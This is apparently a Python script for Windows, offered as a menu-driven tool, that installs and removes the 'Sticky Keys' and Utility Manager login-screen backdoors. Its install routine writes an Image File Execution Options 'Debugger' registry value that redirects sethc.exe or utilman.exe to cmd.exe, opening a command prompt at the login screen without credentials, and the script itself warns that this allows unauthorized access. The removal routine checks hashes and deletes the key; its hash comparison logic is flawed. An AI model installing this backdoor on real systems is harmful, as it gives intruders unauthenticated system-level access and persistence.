import os
import subprocess
import winreg
from hash import calculate_sha256, calculate_md5
from config import header, bar

# TODO: add narrator.exe, osk.exe, magnify.exe, displayswitch.exe,use takeown.exe and icacls.exe to take ownership/perms away from TrustedInstaller
def install_backdoor(path):
    fileName = os.path.basename(path).strip(' ')

    print("Adding " + fileName + " backdoor to registry.")
    try:
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, path)
        try:
            winreg.SetValueEx(key, 'Debugger', 0, winreg.REG_SZ, cmdPath)
        except Exception as e:
            print(e)
            print("Error: Could not create subkey. Please run with Administrator privileges.")
    except Exception as e:
        print(e)
        print("Error: Could not create key. Please run with Administrator privileges.")


def remove_backdoor(path):
    fileName = os.path.basename(path).strip(' ')
    print("Checking for " + fileName + " file replacement.")
    cmd = ("Get-ItemProperty " + path + " | select versioninfo | format-list")
    output = str()
    try:
        subprocess.call([powershellPath, cmd], stdout=open("out.txt", "w+"))
        f = open('out.txt', "r")
    except Exception as e:
        print(e)

    for line in f:
        if 'InternalName' in line or 'OriginalFilename' in line:
            print(line.strip('\n \t'))
            if fileName.strip('2.exe') not in line:
                print(fileName + "file has been replaced.")
                # TODO: provide download link
                print("Please download a legitimate version from Microsoft.")

    print("Validating " + fileName + " hash against cmd.exe, explorer.exe, and powershell.exe hashes")
    # calculate hashes
    sha256 = calculate_sha256(path)
    Md5 = calculate_md5(path)
    cmdSha = calculate_sha256(cmdPath)
    cmdMd5 = calculate_md5(cmdPath)
    explorerSha = calculate_sha256(explorerPath)
    explorerMd5 = calculate_md5(explorerPath)
    powershellSha = calculate_sha256(powershellPath)
    powershellMd5 = calculate_md5(powershellPath)
    if sha256 == (cmdSha or explorerSha or powershellSha) or Md5 == (cmdMd5 or explorerMd5 or powershellMd5):
        print(fileName + " file has been replaced.")
        print(fileName + " Sha256:\n" + sha256)
        print("cmd.exe Sha256:\n" + cmdSha)
        print("explorer.exe Sha256:\n" + explorerSha)
        print("powershell.exe Sha256:\n" + explorerSha)
        print(fileName + "MD5:\n" + Md5)
        print("cmd.exe MD5:\n" + cmdMd5)
        print("explorer.exe MD5:\n" + explorerMd5)
        print("powershell.exe MD5:\n" + explorerMd5)
        # TODO: provide download link
        print("Please download a legitimate version from Microsoft.")
    else:
        print(fileName + " hashes do not match cmd.exe, explorer.exe, or powershell.exe")

    print("Performing " + fileName + " registry analysis.")

    registryPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\" + fileName

    # test if key exists
    try:
        print("Attempting to open " + fileName + " key.")
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registryPath, 0, winreg.KEY_ALL_ACCESS)
    except Exception as e:
        print(e)
        return

    # key was found
    print(fileName + " backdoor debugger registry entry found, attempting to remove.")
    cmd = ('REG DELETE "HKLM\\' + registryPath + '" /f')
    try:
        os.system(cmd)
    except Exception as e:
        print(e)
        return
    print(fileName + " backdoor registry key removed.")


if __name__ == "__main__":
    print(header)

    # get the current drive name
    drive = os.getenv("SystemDrive")
    sethcPath = (drive + "\windows\system32\sethc.exe ")
    sethcRegistryPath = ('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe')
    utilmanPath = (drive + "\windows\system32\\utilman.exe ")
    utilmanRegistryPath = ('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\utilman.exe')
    cmdPath = (drive + "\windows\system32\cmd.exe ")
    explorerPath = (drive + "\windows\explorer.exe ")
    powershellPath = (drive + "\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe")

    while True:
        print(bar)
        print("[I]nstall Backdoor.\n[R]emove Backdoor.\n[C]onfigure Settings.\n[E]xit the Program.")
        choice = input("[>]").lower()
        # install backdoor
        if choice == 'i':
            print(bar)
            print("*WARNING: THIS WILL ALLOW UNAUTHORIZED ACCESS*")
            print("Which backdoor would you like to install?")
            print("[S]ticky Keys (sethc.exe).")
            print("[U]tility Manager (utilman.exe).")
            print("[B]oth.")
            print("[R]eturn to the Main Menu.")
            choice = input("[>]").lower()
            if choice == 's':
                print("At login screen, press shift 5 times to open command prompt.")
                install_backdoor(sethcRegistryPath)
            elif choice == 'u':
                print("At login screen, press [Windows Key + U] to open command prompt.")

                install_backdoor(utilmanRegistryPath)
            elif choice == 'b':
                print("At login screen, press shift 5 times or\n[Windows Key + U] to open command prompt.")
                install_backdoor(sethcRegistryPath)
                install_backdoor(utilmanRegistryPath)
            elif choice == 'r':
                continue
            else:
                print("Incorrect input.")
                continue
        # remove backdoor
        elif choice == 'r':
            print(bar)
            remove_backdoor(sethcPath)
            remove_backdoor(utilmanPath)
        elif choice == 'c':
            print("***Under Construction***\nPlease post any suggestions for configuration to www.github.com/gitgiant")
            print("[D]isable Windows accessibility options in registry. (doesnt work)")
            print("[E]nable Windows accessibility options in registry. (doesnt work)")
            print("[R]eturn to the Main Menu.")
            choice = input("[>]").lower()
            # TODO: Registry files do not work
            if choice == 'd':
                os.system("AccessibilityOFF.reg")
            elif choice == 'e':
                os.system("AccessibilityON.reg")
            elif choice == 'r':
                continue
            else:
                print("Incorrect input.")
                continue
        elif choice == 'e':
            print("Exiting...")
            exit(0)
        else:
            print("Incorrect input.")
            continue